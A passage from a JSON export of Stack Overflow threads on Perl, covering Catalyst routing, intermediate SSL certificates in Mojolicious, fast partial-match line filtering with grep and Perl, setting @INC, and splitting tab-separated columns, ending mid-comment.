....\n    sub index ( $self, $c ) : Path('/area/storage-locker') { ... }\n}\n</code></pre>\n\n<p><em>Update</em>: Because there's some confusion, I meant that we'd much prefer to have devs write this:</p>\n\n<pre><code># getting rid of Args() would be nice, but sigs don't have introspection\nsub travel_to  ( $self, $c, $star ) : Args(1)  { ... }\n</code></pre>\n\n<p>Or this:</p>\n\n<pre><code>package Veure::Controller::Area::StorageLocker {\n    ....\n    sub index ( $self, $c ) { ... }\n}\n</code></pre>\n\n<p>This is important because for an SEO standpoint, underscores instead of hyphens can dramatically improve your SEO. By having to do extra grunt work to always force hyphens, developers are forgetting to do this and we keep wasting money going back and having to rewrite code where this caveat was forgotten. This is the sort of thing which we should be able to do automatically.</p>\n"}, {"tags": ["perl", "ssl-certificate", "mojolicious"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466599107, "post_id": 37967665, "comment_id": 63382201, "body": "According to <a href=\"https://metacpan.org/pod/Mojo::Server::Daemon#listen\" rel=\"nofollow noreferrer\">metacpan.org/pod/Mojo::Server::Daemon#listen</a> your second attempt should work."}, {"owner": {"reputation": 4591, "user_id": 235990, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/4a6bad1085e07d7f29498019f1840f4b?s=128&d=identicon&r=PG", "display_name": "Tobi Oetiker", "link": "https://stackoverflow.com/users/235990/tobi-oetiker"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466599206, "post_id": 37967665, "comment_id": 63382278, "body": "I did read the docs :) or so I think ..."}, {"owner": {"reputation": 891, "user_id": 1936342, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/7a294c91706727c611866ae6df25ba61?s=128&d=identicon&r=PG", "display_name": "Logioniz", "link": "https://stackoverflow.com/users/1936342/logioniz"}, "edited": false, "score": 1, "creation_date": 1466668516, "post_id": 37967665, "comment_id": 63415535, "body": "You don&#39;t need to specify CA param, because CA param is CLIENT CA, not server CA (used to verify client certificate, but you have only server)."}, {"owner": {"reputation": 891, "user_id": 1936342, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/7a294c91706727c611866ae6df25ba61?s=128&d=identicon&r=PG", "display_name": "Logioniz", "link": "https://stackoverflow.com/users/1936342/logioniz"}, "edited": false, "score": 0, "creation_date": 1466673499, "post_id": 37967665, "comment_id": 63418863, "body": "Try to run this command: <code>openssl s_server -cert cert=my.crt -key my.key -accept 8485</code> and client in another console <code>openssl s_client -connect example.com:8485</code>. And looking on output (valid certificate or not). Mojolicious works only with valid certificate. If your certificate not have intermediate certificate, you need to concatenate both certificate."}], "answers": [{"tags": [], "owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "is_accepted": false, "score": 1, "last_activity_date": 1466771613, "creation_date": 1466771613, "answer_id": 38013573, "question_id": 37967665, "link": "https://stackoverflow.com/questions/37967665/how-to-use-an-intermediate-certificates-with-mojolicious/38013573#38013573", "title": "How to use an intermediate certificates with mojolicious", "body": "<p>If you want the server to send not only the leaf (servers) certificate but also any other (intermediate) certificates to the client then you simply add these to the cert file in the correct order. This means your my.crt should look like this</p>\n\n<pre><code>----BEGIN CERTIFICATE-----\nMII... the leaf certificate\n-----END CERTIFICATE-----\n-----BEGIN CERTIFICATE-----\nMII... the first intermediate certificate, i.e. the one which signed the leaf cert\n-----END CERTIFICATE-----\n...\n</code></pre>\n"}], "owner": {"reputation": 4591, "user_id": 235990, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/4a6bad1085e07d7f29498019f1840f4b?s=128&d=identicon&r=PG", "display_name": "Tobi Oetiker", "link": "https://stackoverflow.com/users/235990/tobi-oetiker"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 413, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1466771613, "creation_date": 1466597481, "last_edit_date": 1466625803, "question_id": 37967665, "link": "https://stackoverflow.com/questions/37967665/how-to-use-an-intermediate-certificates-with-mojolicious", "title": "How to use an intermediate certificates with mojolicious", "body": "<p>Mojolicious lets me specify an ssl certificate and key when starting the app:</p>\n\n<pre><code>&gt; ./myapp.pl prefork --listen 'https://*:8485&amp;cert=my.crt&amp;key=my.key'\n</code></pre>\n\n<p>I am trying todo this with a rapidssl certificate. \nConnecting to this service results in wget being rather unhappy:</p>\n\n<pre><code>$ wget https://example.com:8485/\n--2016-06-22 09:50:49--  https://example.com:8485/\nResolving example.com (example.com)... 1.3.2.4\nConnecting to example.com (example.com)|1.3.2.4|:8485... connected.\nERROR: cannot verify example.com's certificate, issued by `/C=US/O=GeoTrust Inc./CN=RapidSSL SHA256 CA - G3':\n  Unable to locally verify the issuer's authority.\nTo connect to example.com insecurely, use `--no-check-certificate'.\n</code></pre>\n\n<p>No big surprise, since when using rapidssl certs in other applications I have\nto specify an intermediate certificate as well. So I tried to add this here too by concatenating the intermediate cert to the site certificate, but this has no influence on the outcome.</p>\n\n<p>I also tried to put the intermediate certificate along with the root cert into a separate file and start with:</p>\n\n<pre><code>&gt; ./myapp.pl prefork --listen 'https://*:8485&amp;cert=my.crt&amp;key=my.key&amp;ca=myca.crt'\n</code></pre>\n\n<p>but the result was equally uninspiring:</p>\n\n<pre><code>error:14094410:SSL routines:SSL3_READ_BYTES:sslv3 alert handshake failure\n</code></pre>\n\n<p>please advise.</p>\n"}, {"tags": ["linux", "perl", "file", "awk"], "comments": [{"owner": {"reputation": 172306, "user_id": 164835, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/ayYoh.jpg?s=128&g=1", "display_name": "Kent", "link": "https://stackoverflow.com/users/164835/kent"}, "edited": false, "score": 1, "creation_date": 1466598770, "post_id": 37967324, "comment_id": 63381945, "body": "define partial. <code>girl</code> a partial match of <code>girlfriend</code>? and <code>*</code> is partial match of anything?"}, {"owner": {"reputation": 149, "user_id": 1057841, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe4164fb59a39d09c280305279193c44?s=128&d=identicon&r=PG", "display_name": "zerg .", "link": "https://stackoverflow.com/users/1057841/zerg"}, "reply_to_user": {"reputation": 172306, "user_id": 164835, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/ayYoh.jpg?s=128&g=1", "display_name": "Kent", "link": "https://stackoverflow.com/users/164835/kent"}, "edited": false, "score": 0, "creation_date": 1466623831, "post_id": 37967324, "comment_id": 63399634, "body": "Yes, girl is a partial match of girlfriend and it should match. I am not using regex inside either of the two files I am comparing. Let&#39;s take as a more precise example: domain.tld is a match for somedomain.tld but it is not a match for domain.tl"}, {"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 2, "creation_date": 1466626291, "post_id": 37967324, "comment_id": 63400892, "body": "Have you tried <code>grep -v -F -f file1 file2</code>? The <code>-F</code> treats the patterns as <i>fixed strings</i>, not as patterns. Perhaps that&#39;s faster. Just an idea. It gives the same result for your sample input but I&#39;m unsure about your real files."}, {"owner": {"reputation": 149, "user_id": 1057841, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe4164fb59a39d09c280305279193c44?s=128&d=identicon&r=PG", "display_name": "zerg .", "link": "https://stackoverflow.com/users/1057841/zerg"}, "edited": false, "score": 0, "creation_date": 1466661444, "post_id": 37967324, "comment_id": 63411670, "body": "You were right, -F made a huge difference, did not expect that, question updated with results."}], "answers": [{"comments": [{"owner": {"reputation": 149, "user_id": 1057841, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe4164fb59a39d09c280305279193c44?s=128&d=identicon&r=PG", "display_name": "zerg .", "link": "https://stackoverflow.com/users/1057841/zerg"}, "edited": false, "score": 0, "creation_date": 1466597524, "post_id": 37967499, "comment_id": 63381036, "body": "Forgot to write it in my question, I tested it but it is extremely slow."}, {"owner": {"reputation": 1159, "user_id": 3835621, "user_type": "registered", "accept_rate": 34, "profile_image": "https://i.stack.imgur.com/IROLC.jpg?s=128&g=1", "display_name": "Arijit Panda", "link": "https://stackoverflow.com/users/3835621/arijit-panda"}, "reply_to_user": {"reputation": 149, "user_id": 1057841, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe4164fb59a39d09c280305279193c44?s=128&d=identicon&r=PG", "display_name": "zerg .", "link": "https://stackoverflow.com/users/1057841/zerg"}, "edited": false, "score": 0, "creation_date": 1466597816, "post_id": 37967499, "comment_id": 63381249, "body": "this grep function is very useful for small data. so you have big size data. Do you have any particular format for your FILE2 data."}, {"owner": {"reputation": 149, "user_id": 1057841, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe4164fb59a39d09c280305279193c44?s=128&d=identicon&r=PG", "display_name": "zerg .", "link": "https://stackoverflow.com/users/1057841/zerg"}, "edited": false, "score": 0, "creation_date": 1466597944, "post_id": 37967499, "comment_id": 63381328, "body": "No particular format, file2 can be anything. And yes, I have very big files, some even of 10GB."}, {"owner": {"reputation": 1159, "user_id": 3835621, "user_type": "registered", "accept_rate": 34, "profile_image": "https://i.stack.imgur.com/IROLC.jpg?s=128&g=1", "display_name": "Arijit Panda", "link": "https://stackoverflow.com/users/3835621/arijit-panda"}, "reply_to_user": {"reputation": 149, "user_id": 1057841, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe4164fb59a39d09c280305279193c44?s=128&d=identicon&r=PG", "display_name": "zerg .", "link": "https://stackoverflow.com/users/1057841/zerg"}, "edited": false, "score": 0, "creation_date": 1466598092, "post_id": 37967499, "comment_id": 63381440, "body": "In file1 you have only words or any particular format?"}, {"owner": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "edited": false, "score": 1, "creation_date": 1466600252, "post_id": 37967499, "comment_id": 63383159, "body": "slow or not, it&#39;s what grep was created to do so it&#39;s very unlikely you&#39;ll find anything faster as the best algorithm we could come up with to make perl/python/awk/whatever execute efficiently will already by implemented in grep."}], "tags": [], "owner": {"reputation": 1159, "user_id": 3835621, "user_type": "registered", "accept_rate": 34, "profile_image": "https://i.stack.imgur.com/IROLC.jpg?s=128&g=1", "display_name": "Arijit Panda", "link": "https://stackoverflow.com/users/3835621/arijit-panda"}, "is_accepted": false, "score": 2, "last_activity_date": 1466597038, "creation_date": 1466597038, "answer_id": 37967499, "question_id": 37967324, "link": "https://stackoverflow.com/questions/37967324/efficient-way-of-comparing-two-files-and-removing-partial-match/37967499#37967499", "title": "Efficient way of comparing two files and removing partial match", "body": "<p>I would like to use <strong>grep</strong> function on linux system</p>\n\n<p><strong>command</strong></p>\n\n<pre><code>grep -v -f File1 File2\n</code></pre>\n\n<p>-v : select non-matching lines</p>\n\n<p>-f :  obtain PATTERN from FILE</p>\n\n<p>your need run the above command on the terminal </p>\n\n<p><strong>output</strong></p>\n\n<pre><code>typo artial\nsomeline\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1159, "user_id": 3835621, "user_type": "registered", "accept_rate": 34, "profile_image": "https://i.stack.imgur.com/IROLC.jpg?s=128&g=1", "display_name": "Arijit Panda", "link": "https://stackoverflow.com/users/3835621/arijit-panda"}, "is_accepted": false, "score": -1, "last_activity_date": 1466598788, "creation_date": 1466598788, "answer_id": 37968126, "question_id": 37967324, "link": "https://stackoverflow.com/questions/37967324/efficient-way-of-comparing-two-files-and-removing-partial-match/37968126#37968126", "title": "Efficient way of comparing two files and removing partial match", "body": "<p>Use of hash is a good way to search for a string in a line. It increases your program speed. so you can try this way and see what is your program speed. I believe this will help you. </p>\n\n<pre><code> my $filename1 =\"file1\";\n    my %myhash;\n    open FH, $filename1 or die \"Error\\n\";\n    while(&lt;FH&gt;)\n    {\n            chomp($_);\n            $myhash{$_}=1;\n\n    }\n    close(FH);\n    my $filename2 = \"file2\";\n\n    open FH1, $filename2 or die \"Error\\n\";\n    while(my $line =&lt;FH1&gt;)\n    {\n            chomp($line);\n            my @arr= split(/\\s/, $line);\n            my $flag=0;\n            foreach my $id (@arr)\n            {\n                    if(exists $myhash{$id})\n                    {\n                            $flag=1;\n                    }\n            }\n            if($flag==0)\n            {\n                    print \"$line\\n\";\n            }\n\n\n    }\n    close(FH1);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 149, "user_id": 1057841, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe4164fb59a39d09c280305279193c44?s=128&d=identicon&r=PG", "display_name": "zerg .", "link": "https://stackoverflow.com/users/1057841/zerg"}, "edited": false, "score": 0, "creation_date": 1466617384, "post_id": 37969988, "comment_id": 63396091, "body": "This one took only 0m2.148s so it is by far the fastest. I can&#39;t confirm the output yet, have to run some smaller tests. Same test files as posted earlier on another solution bellow. Line counts: 7051 file1, 2182387 file2, 1950655 file3. Will get back after I am sure the result is correct."}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": true, "score": 1, "last_activity_date": 1467554547, "last_edit_date": 1467554547, "creation_date": 1466603149, "answer_id": 37969988, "question_id": 37967324, "link": "https://stackoverflow.com/questions/37967324/efficient-way-of-comparing-two-files-and-removing-partial-match/37969988#37969988", "title": "Efficient way of comparing two files and removing partial match", "body": "<p>The simplest way is to build a regex pattern from all of the strings in <code>file1.txt</code>, and print only those files in <code>file2.txt</code> that <em>don't</em> match the pattern</p>\n\n<pre><code>use strict;\nuse warnings 'all';\n\nmy $re = do {\n    open my $fh, '&lt;', 'file1.txt' or die $!;\n    my @data = &lt;$fh&gt;;\n    chomp @data;\n    my $re = join '|', map quotemeta($_), @data;\n    qr/$re/;\n};\n\nopen my $fh, '&lt;', 'file2.txt' or die $!;\n/$re/ or print while &lt;$fh&gt;;\n</code></pre>\n\n<h3>output</h3>\n\n<pre><code>typo artial\nsomeline\n</code></pre>\n"}], "owner": {"reputation": 149, "user_id": 1057841, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe4164fb59a39d09c280305279193c44?s=128&d=identicon&r=PG", "display_name": "zerg .", "link": "https://stackoverflow.com/users/1057841/zerg"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 861, "favorite_count": 0, "accepted_answer_id": 37969988, "answer_count": 3, "score": 2, "last_activity_date": 1467554547, "creation_date": 1466596510, "last_edit_date": 1466762064, "question_id": 37967324, "link": "https://stackoverflow.com/questions/37967324/efficient-way-of-comparing-two-files-and-removing-partial-match", "title": "Efficient way of comparing two files and removing partial match", "body": "<p>I have two files, example:</p>\n\n<p>File1:</p>\n\n<pre><code>partial\nline3\nsomeline2\n</code></pre>\n\n<p>File2:</p>\n\n<pre><code>this is line3\nthis is partial\ntypo artial\nsomeline2\nsomeline\n</code></pre>\n\n<p><strong>Requirement:</strong></p>\n\n<ol>\n<li>Delete all lines from file2 which contains any line from file1.</li>\n<li>There must be a partial match, line from file1 found in file2 (not full line match).</li>\n<li>I am looking for the most efficient way, I am comparing files of millions of lines.</li>\n<li>It can be achieved with any tool/language on linux.</li>\n</ol>\n\n<p><strong>Expected result:</strong></p>\n\n<pre><code>typo artial\nsomeline\n</code></pre>\n\n<p>I tested with python but it is extremely slow.\nAlso tested with grep and it is nearly as slow as python.</p>\n\n<p>The files I am comparing can have up to 10GB in size. Memory on server side is not an issue but I would like not to waste resources.</p>\n\n<p><strong>Testing results based on answers:</strong><br />\nFiles used for testing:</p>\n\n<ul>\n<li>file1 with 7051 lines</li>\n<li>file2 with 2182387 lines</li>\n</ul>\n\n<p>Using grep:</p>\n\n<pre><code># time grep -v -f file1 file2 &gt; file3\nreal    28m50.078s\nuser    27m13.984s\nsys     1m36.068s\n# wc -l file3\n1947790 file3\n</code></pre>\n\n<p>Grep with -F:</p>\n\n<pre><code># time grep -v -F -f file1 file2 &gt; file3\nreal    0m1.441s\nuser    0m1.400s\nsys     0m0.040s\n# wc -l file3\n1950655 file3\n</code></pre>\n\n<p>Using perl posted by Borodin:</p>\n\n<pre><code># time ./clean.pl &gt; file3\nreal    0m2.281s\nuser    0m2.176s\nsys     0m0.104s\n# wc -l file3\n1950655 file3\n</code></pre>\n\n<p>To be honest I did not expect fixed strings to make such a big difference for grep. So far grep wins this, will have to test with 10GB files and time it. After make sure the results are correct. Will be back with an update.</p>\n\n<p><strong>Update</strong></p>\n\n<p>Perl wins this one since I had to introduce some regex for some special cases. For instance I have a big file with domains and I want to exclude those from another file. But that means that I need domain$ as regex, otherwise google.co would match google.com and it is not ok.\nIf you do not have that special case as I had for some files only, grep is the obvious performance winner.</p>\n"}, {"tags": ["perl"], "answers": [{"comments": [{"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "reply_to_user": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1466626832, "post_id": 37966265, "comment_id": 63401148, "body": "@PerlDog: Thanks for the suggestion."}], "tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": true, "score": 3, "last_activity_date": 1466626483, "last_edit_date": 1466626483, "creation_date": 1466593738, "answer_id": 37966265, "question_id": 37966150, "link": "https://stackoverflow.com/questions/37966150/replace-inc-in-perl-from-command-line/37966265#37966265", "title": "Replace @INC in Perl from command line", "body": "<p>To change the @INC from the command line, use the <code>-I</code> option:</p>\n\n<pre><code>perl -lIadded -e 'print for @INC'\n</code></pre>\n\n<p>In a program, you need to modify @INC early enough, i.e. during compile time. This can be done with</p>\n\n<pre><code>BEGIN { unshift @INC, '/path/...' }\n</code></pre>\n\n<p>or by using <a href=\"http://p3rl.org/lib\" rel=\"nofollow\">lib</a></p>\n\n<pre><code>use lib '/path/...';\n</code></pre>\n\n<p>You can also set the <code>PERL5LIB</code> environment variable:</p>\n\n<pre><code>export PERL5LIB=/path/...\nperl -e 'print for @INC'\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1159, "user_id": 3835621, "user_type": "registered", "accept_rate": 34, "profile_image": "https://i.stack.imgur.com/IROLC.jpg?s=128&g=1", "display_name": "Arijit Panda", "link": "https://stackoverflow.com/users/3835621/arijit-panda"}, "is_accepted": false, "score": 0, "last_activity_date": 1466593988, "creation_date": 1466593988, "answer_id": 37966374, "question_id": 37966150, "link": "https://stackoverflow.com/questions/37966150/replace-inc-in-perl-from-command-line/37966374#37966374", "title": "Replace @INC in Perl from command line", "body": "<p>you can use <strong>lib</strong> to put any new directory in your program. </p>\n\n<p>example</p>\n\n<pre><code>use lib \"path\";\n</code></pre>\n\n<p>in your case just add this line in the beginning of your program</p>\n\n<pre><code>use lib \"/usr/lib/\";\n</code></pre>\n\n<p>hope this will work for you.</p>\n"}], "owner": {"reputation": 33, "user_id": 1194032, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/27b2bff2286eb285bb92a968ef8e8af1?s=128&d=identicon&r=PG", "display_name": "user1194032", "link": "https://stackoverflow.com/users/1194032/user1194032"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 726, "favorite_count": 0, "accepted_answer_id": 37966265, "answer_count": 2, "score": 2, "last_activity_date": 1466626483, "creation_date": 1466593468, "question_id": 37966150, "link": "https://stackoverflow.com/questions/37966150/replace-inc-in-perl-from-command-line", "title": "Replace @INC in Perl from command line", "body": "<p>I have a perl script that used to run in a chroot, and now I'd like it to run outside the chroot. That means that I have to somehow point perl to only look for libraries and modules in /where/chroot/used/to/be/usr/lib instead of /usr/lib. I tried adding the new directories inside the script with push @INC, but then the dependencies are still broken, looking in the old dirs.</p>\n\n<p>Is there any way to tell perl when I run the script that I only want it to look in certain dirs for libraries and modules? </p>\n\n<p>Or is there another better way to make sure dependecies still work when the regular dirs (/usr/bin, /usr/lib etc) are replaced by nonstandard ones?</p>\n"}, {"tags": ["python", "perl", "csv"], "comments": [{"owner": {"reputation": 5923, "user_id": 2105156, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/oRMc0.jpg?s=128&g=1", "display_name": "fugu", "link": "https://stackoverflow.com/users/2105156/fugu"}, "edited": false, "score": 3, "creation_date": 1466587163, "post_id": 37963381, "comment_id": 63374007, "body": "The first step to solving this is to put in some effort"}], "answers": [{"tags": [], "owner": {"reputation": 1159, "user_id": 3835621, "user_type": "registered", "accept_rate": 34, "profile_image": "https://i.stack.imgur.com/IROLC.jpg?s=128&g=1", "display_name": "Arijit Panda", "link": "https://stackoverflow.com/users/3835621/arijit-panda"}, "is_accepted": false, "score": 0, "last_activity_date": 1466587667, "creation_date": 1466587667, "answer_id": 37963888, "question_id": 37963381, "link": "https://stackoverflow.com/questions/37963381/divide-column-from-textfile-and-add-description-as-many-numbers-as-in-column/37963888#37963888", "title": "Divide column from textfile and add description as many numbers as in column", "body": "<p>Just split the lines first by tab and then split 2nd column and use loop.</p>\n\n<p>Code</p>\n\n<pre><code>my $filename =\"abc.txt\"; # provide your text filename\nopen FH, $filename or die \"Error\\n\";\nwhile(&lt;FH&gt;)\n{\n        chomp($_);\n        my @arr = split(/\\t/,$_);\n        my @val =split(/;\\s/,$arr[1]); # check the delimiter here if you have any problem\n        foreach my $id (@val)\n        {\n                print \"$arr[0]\\t$id\\t$arr[2]\\n\";\n        }\n\n}\n</code></pre>\n\n<p>Hope this will work for you. </p>\n"}, {"tags": [], "owner": {"reputation": 1133, "user_id": 2185890, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/330b262ed789de0997e720dce8ee1af0?s=128&d=identicon&r=PG", "display_name": "LaintalAy", "link": "https://stackoverflow.com/users/2185890/laintalay"}, "is_accepted": false, "score": 2, "last_activity_date": 1466587687, "creation_date": 1466587687, "answer_id": 37963895, "question_id": 37963381, "link": "https://stackoverflow.com/questions/37963381/divide-column-from-textfile-and-add-description-as-many-numbers-as-in-column/37963895#37963895", "title": "Divide column from textfile and add description as many numbers as in column", "body": "<p>This could be one solution, but you really should have tried before...</p>\n\n<pre><code>#!/usr/bin/env perl\nuse strict;\nuse warnings;\nuse feature qw{say};\n\n{\n    while (&lt;DATA&gt;) {\n        my ($column1, $group1, $group2) = $_ =~ /^(\\w+)\\s+([\\d;\\s]+)(GO.*)$/;\n\n        $group1 =~ s/\\s//g; # Strip spaces / tabs\n        my @list = split /;/, $group1;\n\n        foreach my $element (@list) {\n            say \"$column1\\t$element\\t$group2\";\n        }\n    }\n\n}\n\n__DATA__\nQ6GZX4  81941549; 47060116; 49237298    GO:0006355; GO:0046782; GO:0006351\nQ6GZX1  81941546; 49237301              GO:0033644; GO:0016021\nQ6GZW6  49237306                        GO:0005524; GO:0003677; GO:0004386\nQ6GZW5  81941542; 49237307              GO:0033644; GO:0016021\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 0, "last_activity_date": 1466588691, "creation_date": 1466588691, "answer_id": 37964300, "question_id": 37963381, "link": "https://stackoverflow.com/questions/37963381/divide-column-from-textfile-and-add-description-as-many-numbers-as-in-column/37964300#37964300", "title": "Divide column from textfile and add description as many numbers as in column", "body": "<p>Written as a Unix-style filter and presented with no explanation (as you don't appear to have made any effort to solve the problem before asking for a solution here).</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nwhile (&lt;&gt;) {\n  my @cols = split /\\t/;\n  foreach my $data (split /;\\s+/, $cols[1]) {\n    print \"$cols[0]\\t$data\\t$cols[2]\";\n  }\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 39, "user_id": 3809337, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fc48b70f02cdedfee5a9e5a311f48bc2?s=128&d=identicon&r=PG", "display_name": "rm-ass", "link": "https://stackoverflow.com/users/3809337/rm-ass"}, "is_accepted": false, "score": 0, "last_activity_date": 1466590629, "creation_date": 1466590629, "answer_id": 37965080, "question_id": 37963381, "link": "https://stackoverflow.com/questions/37963381/divide-column-from-textfile-and-add-description-as-many-numbers-as-in-column/37965080#37965080", "title": "Divide column from textfile and add description as many numbers as in column", "body": "<p>Nice to see some perl code !</p>\n\n<p>Here is my python3 solution, didn't tried it with such a big file but curious about issues...</p>\n\n<pre><code>#!/usr/bin/python                                                                                                                                              \n\ndef next_line_formated(entry):\n    key, ids, *_, values = entry.split('\\t')\n    for n in ids.split('; '):\n        yield \"{}  {}\\t{}\".format(key, n, values)\n\nwith open('IN', 'rt') as input_file:\n    with open('OUT', 'w') as output_file:\n        for entry in input_file:\n            for line in next_line_formated(entry):\n                output_file.write(line)\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 5842641, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ff3b2713e5f1f604adb65c1ada387d13?s=128&d=identicon&r=PG&f=1", "display_name": "Wookie777", "link": "https://stackoverflow.com/users/5842641/wookie777"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 56, "favorite_count": 0, "closed_date": 1466593166, "answer_count": 4, "score": -3, "last_activity_date": 1466590629, "creation_date": 1466586379, "question_id": 37963381, "link": "https://stackoverflow.com/questions/37963381/divide-column-from-textfile-and-add-description-as-many-numbers-as-in-column", "closed_reason": "Not suitable for this site", "title": "Divide column from textfile and add description as many numbers as in column", "body": "<p>I have a huge text-file (2 GB) with 3 columns (tab-separated). I want to divide the 2. column, so that every number gets a separate line.</p>\n\n<p>The callange for me is to add the description from column 1 and 3.</p>\n\n<p>The head of the File looks like:</p>\n\n<pre><code>Q6GZX4  81941549; 47060116; 49237298    GO:0006355; GO:0046782; GO:0006351\nQ6GZX1  81941546; 49237301              GO:0033644; GO:0016021\nQ6GZW6  49237306                        GO:0005524; GO:0003677; GO:0004386\nQ6GZW5  81941542; 49237307              GO:0033644; GO:0016021\n</code></pre>\n\n<p>And the output should be:</p>\n\n<pre><code>Q6GZX4  81941549    GO:0006355; GO:0046782; GO:0006351\nQ6GZX4  47060116    GO:0006355; GO:0046782; GO:0006351\nQ6GZX4  49237298    GO:0006355; GO:0046782; GO:0006351\nQ6GZX1  81941546    GO:0033644; GO:0016021\nQ6GZX1  49237301    GO:0033644; GO:0016021\nQ6GZW6  49237306    GO:0005524; GO:0003677; GO:0004386\nQ6GZW5  81941542    GO:0033644; GO:0016021\nQ6GZW5  49237307    GO:0033644; GO:0016021\n</code></pre>\n\n<p>Have everyone an idea how I solve this problem with perl or python?</p>\n"}, {"tags": ["perl", "python-2.7", "variables"], "comments": [{"owner": {"reputation": 106140, "user_id": 213464, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/a7ba62044bc19143ea4a38cf490b67f2?s=128&d=identicon&r=PG", "display_name": "YOU", "link": "https://stackoverflow.com/users/213464/you"}, "edited": false, "score": 2, "creation_date": 1466558592, "post_id": 37957018, "comment_id": 63362067, "body": "programming is not a magic. you are not even parsing perl file. use perl instead."}, {"owner": {"reputation": 47, "user_id": 6343062, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9e2e98dbf7ba6f1850eb9be862ba6e10?s=128&d=identicon&r=PG&f=1", "display_name": "Teddy", "link": "https://stackoverflow.com/users/6343062/teddy"}, "reply_to_user": {"reputation": 106140, "user_id": 213464, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/a7ba62044bc19143ea4a38cf490b67f2?s=128&d=identicon&r=PG", "display_name": "YOU", "link": "https://stackoverflow.com/users/213464/you"}, "edited": false, "score": 0, "creation_date": 1466559081, "post_id": 37957018, "comment_id": 63362162, "body": "@YOU, I would like to but the whole code is written in python as some  parts of my code would be complicated if I use perl. I just need to read that variable file from my python script."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": 